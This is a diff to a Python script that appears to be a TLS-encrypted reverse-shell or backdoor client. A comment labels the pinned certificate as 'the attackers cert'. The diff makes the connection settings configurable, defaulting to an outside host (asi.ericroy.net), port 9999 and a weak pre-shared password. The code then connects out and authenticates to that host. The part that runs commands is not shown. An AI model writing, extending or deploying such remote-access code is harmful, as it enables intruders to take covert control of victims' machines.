@@ -10,10 +10,16 @@ import os
 import subprocess
 import ssl
 import sys
+import argparse
 
-# Configuration
-SERVER_HOST = '127.0.0.1'  # Replace with your server's IP address
-SERVER_PORT = 9999
+# Change here the default values
+parser = argparse.ArgumentParser()
+parser.add_argument('--port', type=int, help='Port to connect to', default=9999)
+parser.add_argument('--host', type=str, help='Host to connect to', default="asi.ericroy.net")
+parser.add_argument('--password', type=str, help='Pre-shared key', default="123456789")
+parser.add_argument('--public-key-path', type=str, help='Server\'s certificate path', default="cert.pem")
+
+args = parser.parse_args()
 
 def tls_socket():
     """
@@ -25,16 +31,16 @@ def tls_socket():
     context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
     context.check_hostname = False  # Optional: disable hostname check
     context.verify_mode = ssl.CERT_REQUIRED
-    context.load_verify_locations("cert.pem")  # the attackers cert
+    context.load_verify_locations(args.public_key_path)  # the attackers cert
 
-    return context.wrap_socket(s, server_hostname=SERVER_HOST)
+    return context.wrap_socket(s, server_hostname=args.host)
 
 def main():
     try:
         s = tls_socket()
-        s.connect((SERVER_HOST, SERVER_PORT))
+        s.connect((args.host, args.port))
         # Send PSK to authenticate themselves
-        s.send(b"supersecret")
+        s.send(args.password.encode())
     except Exception as e:
         sys.exit(f"Connection failed: {e}")
 
